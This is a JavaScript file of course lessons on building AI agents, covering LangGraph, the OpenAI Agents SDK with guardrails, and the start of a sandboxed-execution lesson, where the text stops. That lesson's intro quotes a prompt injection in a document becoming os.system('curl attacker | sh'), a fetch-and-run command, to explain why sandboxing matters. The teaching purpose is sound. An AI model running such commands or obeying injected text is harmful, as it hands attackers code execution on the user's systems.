/* Phase 5 · Agents (part 2: 5.6–5.9) */
(function () {
const L = AISA.lesson;

/* ===================================================================== 5.6 */
L({
  id: '5.6', title: 'LangGraph', minutes: 55, roles: ['be', 'fde'],
  tags: 'StateGraph · nodes and edges · conditional routing · reducers · checkpointers · interrupts · human-in-the-loop · time travel',
  mental: 'LangGraph models an agent or workflow as a graph over a typed state: nodes are functions that return state updates, edges decide what runs next. A checkpointer saves the state after every step, which gives you pause and resume, human approval, crash recovery and replay almost for free.',
  intro: `<p>The hand-written loop of lesson 5.1 is fine until you need branching, approvals that wait hours for a human, recovery after a crash, or a picture of the flow for a security review. LangGraph, from the LangChain team and at 1.x in 2026, is one of the most widely used libraries for exactly that: explicit, inspectable control flow with persistent state.</p>
  <p>Its sweet spot is the middle ground between rigid workflows and free-roaming agents: you fix the skeleton (classify, investigate, approve, act) and let the model decide within nodes.</p>`,
  points: [
    'State is a typed dict; each node returns a partial update; <b>reducers</b> (for example <code class="i">operator.add</code>) say how updates combine, such as appending to a log.',
    'Edges: fixed (<code class="i">add_edge</code>) or conditional (<code class="i">add_conditional_edges</code> with a routing function).',
    'A <b>checkpointer</b> (in-memory for tests, Postgres or SQLite in production) persists state per <code class="i">thread_id</code> after each step.',
    '<code class="i">interrupt()</code> pauses the graph and surfaces a payload to a human; <code class="i">Command(resume=...)</code> continues from that exact point.',
    'State history enables inspection and “time travel”: replay or fork from an earlier checkpoint for debugging.',
    'Prebuilt agent loops exist, but the value is in explicit graphs you can draw, test node by node, and reason about.'
  ],
  concept: { title: 'A flowchart that remembers', body: `<p>Draw your process as a flowchart, make every box a Python function, and have the system photograph the whiteboard after each box finishes. If the server restarts, or a manager takes two days to approve a refund, you pick up from the last photograph. That is the graph plus the checkpointer.</p>` },
  walk: [
    { h: 'State, nodes, edges', body: '<p>The skeleton of every LangGraph program.</p>', code: String.raw`class State(TypedDict):
    ticket: str
    label: str
    log: Annotated[list[str], operator.add]     # reducer: updates append instead of replace

g = StateGraph(State)
g.add_node("classify", classify)
g.add_node("propose", propose)
g.add_edge(START, "classify")
g.add_conditional_edges("classify", route, ["propose", END])
app = g.compile(checkpointer=InMemorySaver())` },
    { h: 'Pause for a human', body: '<p>Inside a node, <code class="i">interrupt(payload)</code> stops the run and returns the payload to the caller. Later, possibly from another process, <code class="i">app.invoke(Command(resume="yes"), config)</code> continues with that value.</p>' },
    { h: 'Persist for real', body: '<p>Swap <code class="i">InMemorySaver</code> for the Postgres checkpointer package in production so runs survive restarts and any worker can resume any thread.</p>' }
  ],
  analogy: `<p><b>A loan application moving through a bank.</b> Each desk (node) adds its stamp to the file (state). Some files go to the risk desk, others skip it (conditional edges). Large loans wait in a manager’s tray for days (interrupt). The file never gets lost because every desk photocopies it before passing it on (checkpointer).</p>`,
  diagram: {
    title: 'A support graph with a human approval step',
    cols: [['start'], ['classify'], ['propose', 'end1'], ['approve', 'act'], ['done']],
    nodes: [
      { id: 'start', label: 'START', sub: 'ticket in', tone: 'fde', info: 'The run begins with the ticket in state.' },
      { id: 'classify', label: 'classify', sub: 'LLM or rules', tone: 'acc', info: 'Sets state.label.' },
      { id: 'propose', label: 'propose', sub: 'refund amount', info: 'Investigates and proposes an action.' },
      { id: 'end1', label: 'END', sub: 'not billing', info: 'Other tickets leave the graph here.' },
      { id: 'approve', label: 'approve', sub: 'interrupt()', tone: 'warn', info: 'Pauses for a human when the amount is over the limit; resumes with their decision.' },
      { id: 'act', label: 'act', sub: 'issue or decline', tone: 'be', info: 'Executes the decision with an idempotency key.' },
      { id: 'done', label: 'END', sub: 'checkpointed', tone: 'ok', info: 'Every step was saved by the checkpointer under the thread id.' }
    ],
    edges: [{ a: 'start', b: 'classify', step: 1 }, { a: 'classify', b: 'propose', label: 'billing', step: 2 }, { a: 'classify', b: 'end1', dash: true, step: 2 }, { a: 'propose', b: 'approve', label: '> $50', step: 3 }, { a: 'propose', b: 'act', dash: true, step: 3 }, { a: 'approve', b: 'act', step: 4 }, { a: 'act', b: 'done', step: 5 }],
    steps: ['The ticket enters the graph.', 'Classification routes billing tickets onward.', 'Large refunds go to approval, small ones straight to action.', 'The run pauses until a human resumes it.', 'The action runs and the state is saved.'],
    caption: 'Explicit flow, model decisions inside nodes, state saved after every step.'
  },
  illustrated: { title: 'What the checkpointer stores', body: `<div class="tbl"><table><thead><tr><th>checkpoint</th><th>next node</th><th>state.log</th></tr></thead><tbody>
    <tr><td class="n">1</td><td>classify</td><td>[]</td></tr>
    <tr><td class="n">2</td><td>propose</td><td>[classify → billing]</td></tr>
    <tr><td class="n">3</td><td>approve (paused)</td><td>[…, propose refund 9000]</td></tr>
    <tr><td class="n">4</td><td>act</td><td>[…, human said yes]</td></tr>
    <tr><td class="n">5</td><td>(done)</td><td>[…, refund issued]</td></tr></tbody></table></div>
    <p>A crash between checkpoints 3 and 4 loses nothing: the next invoke with the same thread id resumes at approve.</p>` },
  code: {
    title: 'A graph with routing, an interrupt, resume and state history', file: 'graph.py', deps: 'uv add langgraph',
    intro: '<p>The support graph from the diagram. Nodes use simple rules where a real system would call a model; the control flow, interrupt, checkpointer and history are real LangGraph. The run pauses at approval, then resumes with a human decision.</p>',
    src: String.raw`import operator
from typing import Annotated, TypedDict
from langgraph.checkpoint.memory import InMemorySaver
from langgraph.graph import END, START, StateGraph
from langgraph.types import Command, interrupt

class State(TypedDict, total=False):
    ticket: str
    label: str
    refund_cents: int
    approved: bool
    log: Annotated[list[str], operator.add]

def classify(s: State):
    label = "billing" if "charged" in s["ticket"].lower() else "other"
    return {"label": label, "log": [f"classify -> {label}"]}

def propose(s: State):
    cents = 9000 if "annual" in s["ticket"] else 4800
    return {"refund_cents": cents, "log": [f"propose refund {cents}"]}

def approve(s: State):
    decision = interrupt({"question": f"Approve a refund of {s['refund_cents']} cents?", "ticket": s["ticket"]})
    return {"approved": decision == "yes", "log": [f"human said {decision}"]}

def act(s: State):
    ok = s.get("approved", True)
    return {"log": ["refund issued" if ok else "refund declined, customer notified"]}

g = StateGraph(State)
for name, fn in [("classify", classify), ("propose", propose), ("approve", approve), ("act", act)]:
    g.add_node(name, fn)
g.add_edge(START, "classify")
g.add_conditional_edges("classify", lambda s: "propose" if s["label"] == "billing" else END, ["propose", END])
g.add_conditional_edges("propose", lambda s: "approve" if s["refund_cents"] > 5000 else "act", ["approve", "act"])
g.add_edge("approve", "act")
g.add_edge("act", END)
app = g.compile(checkpointer=InMemorySaver())

for thread, ticket in [("t-1", "Charged twice on my monthly plan"), ("t-2", "Charged twice on my annual plan"), ("t-3", "How do I export CSV?")]:
    cfg = {"configurable": {"thread_id": thread}}
    out = app.invoke({"ticket": ticket, "log": []}, cfg)
    if "__interrupt__" in out:
        print(f"{thread}: PAUSED -> {out['__interrupt__'][0].value['question']} (next: {app.get_state(cfg).next})")
        out = app.invoke(Command(resume="yes"), cfg)          # later, from any worker, after a human clicks Approve
        print(f"{thread}: resumed")
    print(f"{thread}: {out['log']}")

history = list(app.get_state_history({"configurable": {"thread_id": "t-2"}}))
print("\ncheckpoints saved for t-2:", len(history), "| oldest next-node:", history[-1].next, "| newest next-node:", history[0].next)
print("\n" + app.get_graph().draw_mermaid().split("---\n")[-1].strip())`
  },
  lab: {
    title: 'A drafting graph with a quality loop and approval', file: 'draft_graph_lab.py', deps: 'uv add langgraph',
    scenario: `<p>A customer wants agent-drafted replies to complaint emails, but legal requires that every reply mentioning compensation is approved by a human, and that replies never promise timelines. Build a graph: draft → check (rules) → back to draft with feedback, at most 2 revisions → approval interrupt if compensation is mentioned → send. Use a checkpointer and resume the paused run.</p>`,
    steps: ['State: email, draft, feedback (list, appended), revisions (int), approved (bool).', '<code class="i">draft</code>: a fake drafter that promises “within 24 hours” on the first try and fixes it when feedback mentions timelines.', '<code class="i">check</code>: flags timeline promises; route back to draft if flagged and revisions < 2, otherwise continue.', '<code class="i">approval</code>: interrupt when the draft mentions compensation.', 'Run two emails; resume the paused one with “approve”; print the final drafts and feedback.'],
    checks: ['The first draft is revised once and the final draft promises no timeline.', 'Only the compensation email pauses.', 'Both runs end at send.'],
    hints: ['A conditional edge after check returns "draft" or "approval_gate".', 'Pass the feedback list into the drafter so it can respond to it.'],
    starter: String.raw`import operator
from typing import Annotated, TypedDict
from langgraph.checkpoint.memory import InMemorySaver
from langgraph.graph import END, START, StateGraph
from langgraph.types import Command, interrupt

class State(TypedDict, total=False):
    email: str
    draft: str
    feedback: Annotated[list[str], operator.add]
    revisions: int
    approved: bool

# TODO: nodes draft, check, approval_gate, send; edges; compile with InMemorySaver; run two emails`,
    solution: String.raw`import operator, re
from typing import Annotated, TypedDict
from langgraph.checkpoint.memory import InMemorySaver
from langgraph.graph import END, START, StateGraph
from langgraph.types import Command, interrupt

class State(TypedDict, total=False):
    email: str
    draft: str
    feedback: Annotated[list[str], operator.add]
    revisions: int
    approved: bool

def draft(s: State):
    """Stand-in for an LLM drafting call that receives the feedback so far."""
    comp = "a $20 credit as an apology" if "refund" in s["email"] else "our apologies"
    timeline = "" if any("timeline" in f for f in s.get("feedback", [])) else " We will fix this within 24 hours."
    return {"draft": f"Thank you for your patience. We are offering {comp}.{timeline}", "revisions": s.get("revisions", -1) + 1}

def check(s: State):
    if re.search(r"within \d+ (hours|days)", s["draft"]):
        return {"feedback": ["remove the timeline promise"]}
    return {"feedback": []}

def after_check(s: State):
    flagged = re.search(r"within \d+ (hours|days)", s["draft"])
    return "draft" if flagged and s["revisions"] < 2 else "approval_gate"

def approval_gate(s: State):
    if "credit" in s["draft"]:
        decision = interrupt({"draft": s["draft"], "reason": "mentions compensation"})
        return {"approved": decision == "approve"}
    return {"approved": True}

def send(s: State):
    return {"feedback": ["sent" if s["approved"] else "held: not approved"]}

g = StateGraph(State)
for n, f in [("draft", draft), ("check", check), ("approval_gate", approval_gate), ("send", send)]:
    g.add_node(n, f)
g.add_edge(START, "draft"); g.add_edge("draft", "check")
g.add_conditional_edges("check", after_check, ["draft", "approval_gate"])
g.add_edge("approval_gate", "send"); g.add_edge("send", END)
app = g.compile(checkpointer=InMemorySaver())

for tid, email in [("e-1", "Your app was down all morning."), ("e-2", "I want a refund, you charged me twice.")]:
    cfg = {"configurable": {"thread_id": tid}}
    out = app.invoke({"email": email, "feedback": []}, cfg)
    if "__interrupt__" in out:
        print(f"{tid}: paused for approval ({out['__interrupt__'][0].value['reason']})")
        out = app.invoke(Command(resume="approve"), cfg)
    print(f"{tid}: revisions={out['revisions']} feedback={out['feedback']}\n      final: {out['draft']}")`
  },
  design: {
    lead: '<p>Graph frameworks shine when processes are long-running, need humans in the loop and must survive restarts. Treat the checkpointer as production data and the graph as reviewed code.</p>',
    scale: [{ h: 'Durable checkpointer', p: 'Use a Postgres-backed checkpointer with retention policies; state grows per step, so trim large fields or store blobs elsewhere.' }, { h: 'Workers resume anywhere', p: 'Because state lives in the checkpointer, any worker can resume any thread, which suits queue-based deployment.' }],
    fail: [{ h: 'Side effects replayed', p: 'Resuming re-runs the interrupted node from its start. Code before interrupt() runs twice: keep side effects after the interrupt or make them idempotent.' }, { h: 'Unbounded loops', p: 'Cycles need explicit counters in state or a recursion limit, or a quality loop can spin forever.' }],
    trade: [{ h: 'Graph vs plain code', p: 'Graphs add structure, persistence and visualisation; plain code is simpler for short, linear flows.' }, { h: 'LangGraph vs durable execution engines', p: 'LangGraph persists agent state at node boundaries; engines like Temporal (Phase 9.9) give stronger guarantees for long, multi-service workflows. Some teams use both.' }],
    prompt: '<p>Design an expense-approval agent: reads receipts, checks policy, asks managers for approval over limits, then pays. Managers can take days.</p>',
    answer: '<ul><li>Graph: extract → validate policy → conditional route → manager approval interrupt → pay → notify.</li><li>Postgres checkpointer keyed by expense id; resume from the approval UI or email link.</li><li>Payment node idempotent with the expense id as key; no side effects before interrupts.</li><li>State history kept for audit; timeouts escalate to the next approver.</li></ul>'
  },
  quiz: [
    { q: 'What does a reducer like operator.add on a state field do?', o: ['Sums numbers only', 'Combines updates from nodes by appending instead of replacing', 'Deletes old state', 'Sorts the state'], a: 1, why: 'Reducers define how partial updates merge into state.' },
    { q: 'After interrupt() pauses a run, how do you continue it?', o: ['Start a new thread', 'Invoke with Command(resume=value) and the same thread_id', 'Restart the server', 'Call interrupt() again'], a: 1, why: 'The checkpointer resumes the same thread at the paused node.' },
    { q: 'Why must code before interrupt() in a node be idempotent?', o: ['For speed', 'The node runs again from its start when resumed', 'LangGraph forbids side effects', 'To save tokens'], a: 1, why: 'Resumption replays the interrupted node.' }
  ],
  interview: [
    { q: 'Why use LangGraph instead of a simple loop?', a: '<p>When I need explicit control flow with branches and cycles, persistent state per thread, human-in-the-loop pauses that can last days, crash recovery and the ability to inspect or replay past steps. For a short linear flow, a plain loop or function chain is simpler and I would not add the dependency.</p>' },
    { q: 'How do you implement human approval in an agent?', a: '<p>Pause the run at an approval node with the proposed action as payload, persist state with a durable checkpointer, notify the approver, and resume with their decision. The action itself runs after approval and is idempotent, and the approval decision is recorded for audit.</p>' }
  ]
});

/* ===================================================================== 5.7 */
L({
  id: '5.7', title: 'OpenAI Agents SDK', minutes: 50, roles: ['fde', 'be'],
  tags: 'Agent · Runner · function_tool · handoffs · guardrails · structured output_type · sessions · tracing',
  mental: 'The OpenAI Agents SDK packages the agent loop into a few primitives: Agents (instructions, tools, model), handoffs between agents, guardrails that run alongside, typed outputs, and a Runner that drives the loop with tracing. It is provider-agnostic enough to run against other models through its model interface.',
  intro: `<p>Many customers standardise on a framework, and the OpenAI Agents SDK is one of the most common in 2026, alongside LangGraph, Google’s ADK, the Claude Agent SDK and others. FDEs need to be productive in whichever one the customer picked. The concepts transfer: this lesson maps the loop you wrote in 5.1 onto the SDK’s primitives.</p>
  <p>The SDK also integrates with durable execution: an official Temporal integration (generally available in 2026) runs agents as durable workflows that survive crashes and long waits.</p>`,
  points: [
    '<code class="i">Agent</code>: name, instructions, tools, handoffs, guardrails, optional <code class="i">output_type</code> for structured results.',
    '<code class="i">@function_tool</code> turns a typed, documented Python function into a tool with a generated schema.',
    '<b>Handoffs</b> let a triage agent transfer the conversation to a specialist; they appear to the model as tools named <code class="i">transfer_to_&lt;agent&gt;</code>.',
    '<b>Guardrails</b> validate input or output and can trip a wire that stops the run.',
    '<code class="i">Runner.run(agent, input, max_turns=...)</code> drives the loop; results include the final output, the last agent and every item produced.',
    'Built-in tracing records runs, tool calls and handoffs; sessions persist conversation history between runs.'
  ],
  concept: { title: 'Same loop, named parts', body: `<p>Everything here maps to lesson 5.1: Runner is the loop, function tools are your registry, max_turns is the step budget, guardrails are pre- and post-checks, handoffs are a special tool that swaps the active agent, and tracing is the transcript. Knowing the hand-written version is what lets you debug the framework version.</p>` },
  walk: [
    { h: 'Agents, tools and a handoff', body: '<p>A triage agent hands billing issues to a billing agent that has tools and a typed output.</p>', code: String.raw`from agents import Agent, Runner, function_tool

@function_tool
def get_invoice(invoice_id: str) -> str:
    """Fetch an invoice by id (format INV-123)."""
    return billing.get(invoice_id).model_dump_json()

billing = Agent(name="billing", instructions="Resolve billing issues.", tools=[get_invoice], output_type=Resolution)
triage = Agent(name="triage", instructions="Route to the right specialist.", handoffs=[billing])
result = await Runner.run(triage, "I was charged twice on INV-991", max_turns=8)` },
    { h: 'Add a guardrail', body: '<p>An input guardrail runs a check (rules or a cheap model) and trips before the expensive agent does work it should not.</p>', code: String.raw`@input_guardrail
async def no_card_numbers(ctx, agent, user_input) -> GuardrailFunctionOutput:
    hit = looks_like_card_number(user_input)
    return GuardrailFunctionOutput(output_info={"card_like": hit}, tripwire_triggered=hit)` },
    { h: 'Run it durably', body: '<p>For long or approval-heavy runs, the Temporal integration executes the agent loop as a durable workflow: model calls and tools become activities that are retried and recorded (Phase 9.9).</p>' }
  ],
  analogy: `<p><b>A call centre switchboard.</b> The receptionist (triage agent) answers, decides who should handle the call, and transfers it (handoff) with the context. A compliance recording (tracing) captures everything, and a screening rule (guardrail) drops calls that should never reach an agent.</p>`,
  diagram: {
    title: 'Agents SDK primitives',
    cols: [['in'], ['ig'], ['triage'], ['billing', 'tech'], ['og'], ['out']],
    nodes: [
      { id: 'in', label: 'User input', tone: 'fde', info: 'The run input.' },
      { id: 'ig', label: 'Input guardrail', sub: 'tripwire', tone: 'bad', info: 'Runs a check; a tripped wire stops the run.' },
      { id: 'triage', label: 'Triage agent', sub: 'handoffs', tone: 'acc', info: 'Decides which specialist should handle the request.' },
      { id: 'billing', label: 'Billing agent', sub: 'tools · output_type', tone: 'be', info: 'Has function tools and a structured output type.' },
      { id: 'tech', label: 'Tech agent', sub: 'tools', info: 'Another specialist.' },
      { id: 'og', label: 'Output guardrail', sub: 'validate', tone: 'warn', info: 'Checks the final output before returning it.' },
      { id: 'out', label: 'RunResult', sub: 'final_output · items · trace', tone: 'ok', info: 'Typed final output, every item and a trace.' }
    ],
    edges: [{ a: 'in', b: 'ig', step: 1 }, { a: 'ig', b: 'triage', step: 2 }, { a: 'triage', b: 'billing', label: 'handoff', step: 3 }, { a: 'triage', b: 'tech', dash: true, step: 3 }, { a: 'billing', b: 'og', step: 4 }, { a: 'og', b: 'out', step: 5 }],
    steps: ['Input arrives.', 'The input guardrail checks it.', 'Triage hands off to a specialist.', 'The specialist uses tools and produces typed output.', 'Output is validated and returned with a trace.'],
    caption: 'The 5.1 loop, packaged: agents, handoffs, guardrails, runner, trace.'
  },
  illustrated: { title: 'Mapping concepts across frameworks', body: `<div class="tbl"><table><thead><tr><th>concept</th><th>hand loop (5.1)</th><th>OpenAI Agents SDK</th><th>LangGraph</th></tr></thead><tbody>
    <tr><td>loop driver</td><td>for step in range</td><td>Runner.run</td><td>compiled graph invoke</td></tr>
    <tr><td>tools</td><td>registry dict</td><td>@function_tool</td><td>tool node or functions in nodes</td></tr>
    <tr><td>specialists</td><td>if/else routing</td><td>handoffs</td><td>conditional edges, subgraphs</td></tr>
    <tr><td>checks</td><td>guard function</td><td>input and output guardrails</td><td>check nodes</td></tr>
    <tr><td>persistence</td><td>your database</td><td>sessions; Temporal integration</td><td>checkpointers</td></tr>
    <tr><td>observability</td><td>transcript list</td><td>built-in tracing</td><td>LangSmith or OpenTelemetry</td></tr></tbody></table></div>` },
  code: {
    title: 'Triage, handoff, tools, typed output and a guardrail', file: 'agents_sdk.py', deps: 'uv add openai-agents',
    intro: '<p class="callout"><b>Runs without a key</b> The Agents SDK and OpenAI client are real; the network is replaced by a local fake Chat Completions endpoint that chooses handoffs and tool calls from the request, so the run is visible and repeatable. Remove the fake client to use a real model.</p><p>Watch the request log: the triage agent sees only the handoff tool, the billing agent sees its own tool and a JSON schema response format generated from <code class="i">Resolution</code>. The second run trips the guardrail before any model call.</p>',
    src: String.raw`import asyncio, json, re
from pydantic import BaseModel
from openai import AsyncOpenAI
from agents import (Agent, GuardrailFunctionOutput, InputGuardrailTripwireTriggered, OpenAIChatCompletionsModel,
                    RunContextWrapper, Runner, function_tool, input_guardrail, set_tracing_disabled)
try:
    import httpx2 as httpx
except ImportError:
    import httpx
set_tracing_disabled(True)                   # the demo has no tracing backend; leave tracing on in real runs

# ---- fake Chat Completions endpoint ----
def fake(request):
    body = json.loads(request.content)
    tools = [t["function"]["name"] for t in body.get("tools", [])]
    done = {m.get("tool_call_id") for m in body["messages"] if m["role"] == "tool"}
    print(f"  model call: tools={tools} response_format={body.get('response_format', {}).get('type')}")
    def reply(msg, finish):
        return httpx.Response(200, json={"id": "c", "object": "chat.completion", "created": 0, "model": body["model"],
            "choices": [{"index": 0, "message": msg, "finish_reason": finish}], "usage": {"prompt_tokens": 120, "completion_tokens": 25, "total_tokens": 145}})
    call = lambda cid, name, args: reply({"role": "assistant", "content": None, "tool_calls": [{"id": cid, "type": "function", "function": {"name": name, "arguments": json.dumps(args)}}]}, "tool_calls")
    if "transfer_to_billing" in tools:
        return call("h1", "transfer_to_billing", {})
    if "get_invoice" in tools and "t1" not in done:
        return call("t1", "get_invoice", {"invoice_id": "INV-991"})
    return reply({"role": "assistant", "content": json.dumps({"invoice_id": "INV-991", "duplicate": True, "refund_cents": 4800,
                  "summary": "Two $48 charges nine seconds apart; refund the second."})}, "stop")
model = OpenAIChatCompletionsModel(model="gpt-demo", openai_client=AsyncOpenAI(api_key="test", http_client=httpx.AsyncClient(transport=httpx.MockTransport(fake))))
# ---------------------------------------

class Resolution(BaseModel):
    invoice_id: str
    duplicate: bool
    refund_cents: int
    summary: str

@function_tool
def get_invoice(invoice_id: str) -> str:
    """Fetch one invoice by id (format INV-123) with its charges."""
    return json.dumps({"invoice_id": invoice_id, "charges": [{"id": "ch_1", "cents": 4800}, {"id": "ch_2", "cents": 4800}]})

@input_guardrail
async def no_card_numbers(ctx: RunContextWrapper, agent: Agent, user_input) -> GuardrailFunctionOutput:
    text = user_input if isinstance(user_input, str) else json.dumps(user_input)
    hit = bool(re.search(r"\d{13,19}", re.sub(r"[ -]", "", text)))
    return GuardrailFunctionOutput(output_info={"card_like": hit}, tripwire_triggered=hit)

billing = Agent(name="billing", instructions="Resolve billing issues using tools.", tools=[get_invoice], output_type=Resolution, model=model)
triage = Agent(name="triage", instructions="Route each request to the right specialist.", handoffs=[billing],
               input_guardrails=[no_card_numbers], model=model)

async def main():
    print("run 1")
    result = await Runner.run(triage, "I was charged twice on INV-991", max_turns=6)
    print("  final agent:", result.last_agent.name)
    print("  items:", [type(i).__name__ for i in result.new_items])
    print("  output:", repr(result.final_output))
    print("run 2")
    try:
        await Runner.run(triage, "My card 4242 4242 4242 4242 was charged twice", max_turns=6)
    except InputGuardrailTripwireTriggered as e:
        print("  guardrail tripped:", e.guardrail_result.output.output_info, "-> ask the user to remove card details")

asyncio.run(main())`
  },
  lab: {
    title: 'Add an output guardrail and a second specialist', file: 'agents_lab.py', deps: 'uv add openai-agents',
    scenario: `<p>Extend the Code tab’s system for a customer pilot: add a <code class="i">tech</code> specialist with a <code class="i">check_status</code> tool, route login problems to it, and add an output guardrail on the billing agent that trips if <code class="i">refund_cents</code> exceeds 5,000 (those must go to a human). Run three inputs and report what happened for each.</p>`,
    steps: ['Copy the fake endpoint; extend it so the triage agent hands off to <code class="i">transfer_to_tech</code> when the user message mentions login, and to billing otherwise.', 'Give the tech agent a <code class="i">check_status</code> function tool and a plain text output.', 'Write <code class="i">@output_guardrail</code> <code class="i">refund_limit</code> that trips when <code class="i">output.refund_cents &gt; 5000</code>.', 'Make the fake billing answer 9,000 cents when the message mentions “annual”.', 'Run: a login issue, a monthly duplicate charge, an annual duplicate charge; catch <code class="i">OutputGuardrailTripwireTriggered</code>.'],
    checks: ['The login issue ends with the tech agent.', 'The monthly charge returns a Resolution.', 'The annual charge trips the output guardrail.'],
    hints: ['The user’s text is the first user message in the request body.', 'Output guardrails receive <code class="i">(ctx, agent, output)</code> where output is the typed final output.'],
    starter: String.raw`# Start from the Code tab's file, then:
# 1. add check_status tool and a tech Agent
# 2. handoffs=[billing, tech] on triage, and teach the fake endpoint to pick one
# 3. @output_guardrail refund_limit on billing
# 4. run three inputs
`,
    solution: String.raw`import asyncio, json
from pydantic import BaseModel
from openai import AsyncOpenAI
from agents import (Agent, GuardrailFunctionOutput, OpenAIChatCompletionsModel, OutputGuardrailTripwireTriggered,
                    RunContextWrapper, Runner, function_tool, output_guardrail, set_tracing_disabled)
try:
    import httpx2 as httpx
except ImportError:
    import httpx
set_tracing_disabled(True)

def fake(request):
    body = json.loads(request.content)
    tools = [t["function"]["name"] for t in body.get("tools", [])]
    user = next(m["content"] for m in body["messages"] if m["role"] == "user")
    user = user if isinstance(user, str) else json.dumps(user)
    done = {m.get("tool_call_id") for m in body["messages"] if m["role"] == "tool"}
    def reply(msg, finish):
        return httpx.Response(200, json={"id": "c", "object": "chat.completion", "created": 0, "model": body["model"],
            "choices": [{"index": 0, "message": msg, "finish_reason": finish}], "usage": {"prompt_tokens": 100, "completion_tokens": 20, "total_tokens": 120}})
    call = lambda cid, name, args: reply({"role": "assistant", "content": None, "tool_calls": [{"id": cid, "type": "function", "function": {"name": name, "arguments": json.dumps(args)}}]}, "tool_calls")
    if "transfer_to_billing" in tools:
        return call("h", "transfer_to_tech" if "login" in user.lower() else "transfer_to_billing", {})
    if "check_status" in tools:
        if "s1" not in done:
            return call("s1", "check_status", {"service": "sso"})
        return reply({"role": "assistant", "content": "SSO is degraded right now; sign-ins should recover within the hour."}, "stop")
    if "get_invoice" in tools and "t1" not in done:
        return call("t1", "get_invoice", {"invoice_id": "INV-991"})
    cents = 9000 if "annual" in user.lower() else 4800
    return reply({"role": "assistant", "content": json.dumps({"invoice_id": "INV-991", "duplicate": True, "refund_cents": cents, "summary": "Duplicate charge found."})}, "stop")

model = OpenAIChatCompletionsModel(model="gpt-demo", openai_client=AsyncOpenAI(api_key="test", http_client=httpx.AsyncClient(transport=httpx.MockTransport(fake))))

class Resolution(BaseModel):
    invoice_id: str
    duplicate: bool
    refund_cents: int
    summary: str

@function_tool
def get_invoice(invoice_id: str) -> str:
    """Fetch one invoice by id (format INV-123) with its charges."""
    return json.dumps({"invoice_id": invoice_id, "charges": [4800, 4800]})

@function_tool
def check_status(service: str) -> str:
    """Check the live status of a service such as sso, api or billing."""
    return json.dumps({"service": service, "status": "degraded"})

@output_guardrail
async def refund_limit(ctx: RunContextWrapper, agent: Agent, output: Resolution) -> GuardrailFunctionOutput:
    over = output.refund_cents > 5000
    return GuardrailFunctionOutput(output_info={"refund_cents": output.refund_cents}, tripwire_triggered=over)

billing = Agent(name="billing", instructions="Resolve billing issues.", tools=[get_invoice], output_type=Resolution,
                output_guardrails=[refund_limit], model=model)
tech = Agent(name="tech", instructions="Diagnose technical issues.", tools=[check_status], model=model)
triage = Agent(name="triage", instructions="Route to billing or tech.", handoffs=[billing, tech], model=model)

async def main():
    for text in ["I can't login with SSO", "Charged twice on my monthly plan", "Charged twice on my annual plan"]:
        try:
            r = await Runner.run(triage, text, max_turns=8)
            print(f"{text!r}\n   -> {r.last_agent.name}: {r.final_output!r}")
        except OutputGuardrailTripwireTriggered as e:
            print(f"{text!r}\n   -> output guardrail tripped {e.guardrail_result.output.output_info}: route to a human approver")

asyncio.run(main())`
  },
  design: {
    lead: '<p>Frameworks speed up the first version and shape the next ten. Choose one the customer can operate, keep your tools and prompts framework-independent, and make sure you can observe and test what the framework does.</p>',
    scale: [{ h: 'Durability', p: 'In-process Runner calls die with the process. For long runs, use the Temporal integration or run agents as jobs with persisted sessions.' }, { h: 'Model flexibility', p: 'The SDK’s model interface accepts other providers via compatible clients or adapters, which lets you route by cost and capability (Phase 9.1).' }],
    fail: [{ h: 'Framework lock-in', p: 'Business logic buried in framework callbacks is hard to move. Keep tools as plain functions and prompts as versioned files.' }, { h: 'Guardrails as the only control', p: 'Guardrails catch content; authorization and limits still belong in tool code.' }],
    trade: [{ h: 'Agents SDK vs LangGraph', p: 'The Agents SDK is concise for agent-centric apps with handoffs; LangGraph gives explicit graphs and checkpoint-level control. Both are fine; consistency with the customer’s stack matters more.' }, { h: 'Handoffs vs agents-as-tools', p: 'Handoffs transfer control; calling a specialist as a tool keeps the orchestrator in charge and returns a result.' }],
    prompt: '<p>A customer built a prototype on the Agents SDK that works in demos but fails under load and loses runs on deploys. What do you change?</p>',
    answer: '<ul><li>Move runs off the request path: job queue or the Temporal integration for durable execution.</li><li>Persist sessions in a database; idempotent tools for writes.</li><li>Concurrency limits and retries at the model gateway; budgets via max_turns and token caps.</li><li>Export traces to the customer’s observability stack; add evals for the main flows before scaling.</li></ul>'
  },
  quiz: [
    { q: 'How does a handoff appear to the model?', o: ['As a system prompt change', 'As a tool such as transfer_to_billing', 'It is invisible', 'As a new user message'], a: 1, why: 'Handoffs are exposed as tools; calling one switches the active agent.' },
    { q: 'What happens when an input guardrail trips?', o: ['A warning is logged and the run continues', 'The run stops with a tripwire exception', 'The model retries', 'The input is silently edited'], a: 1, why: 'Tripwires halt execution so you can handle the case.' },
    { q: 'Setting output_type to a Pydantic model makes the SDK:', o: ['Ignore tools', 'Request structured output and return a typed object as final_output', 'Disable handoffs', 'Stream tokens'], a: 1, why: 'The schema is sent as a response format and parsed into the model.' }
  ],
  interview: [
    { q: 'A customer uses the OpenAI Agents SDK and you know LangGraph. How do you get productive?', a: '<p>Map concepts: Runner is the loop, function tools are the registry, handoffs are routing, guardrails are checks, sessions are memory, tracing is the transcript. Then I read their traces for real runs, write a small eval set, and keep tools and prompts independent of the framework so improvements carry over.</p>' },
    { q: 'What do guardrails protect against, and what do they not?', a: '<p>They screen inputs and outputs: personal data, off-topic requests, policy violations, out-of-range values. They do not replace authorization and limits in tool code, because a model can still be manipulated into calling tools; those checks must live where actions happen.</p>' }
  ]
});

/* ===================================================================== 5.8 */
L({
  id: '5.8', title: 'Sandboxed execution: E2B, Modal', minutes: 50, roles: ['be', 'fde'],
  tags: 'code execution tools · isolation levels · microVMs · gVisor · resource limits · network egress · file I/O · timeouts',
  mental: 'Model-written code is untrusted code. Run it somewhere that can be destroyed: an isolated sandbox with no secrets, limited CPU, memory, disk, time and network, and only the files the task needs. Never on your application server.',
  intro: `<p>Code execution turns an LLM from a talker into a doer: analysing a customer’s CSV, generating a chart, running tests on a patch. It is also the riskiest tool you can give an agent. A prompt injection hidden in a document can become <code class="i">os.system("curl attacker | sh")</code> in the next step.</p>
  <p>Hosted sandbox services exist for exactly this. <b>E2B</b> runs sandboxes in Firecracker microVMs, <b>Modal</b> runs them on gVisor-isolated containers with GPU options, and others offer similar services. For local development and defence in depth, you should also understand what operating-system limits can and cannot do.</p>`,
  points: [
    'Isolation levels, weakest to strongest: a subprocess with limits, a container, a gVisor sandbox, a microVM. Use microVMs or gVisor for untrusted code in production.',
    'Limits: CPU time, memory, disk, number of processes, wall-clock timeout, output size.',
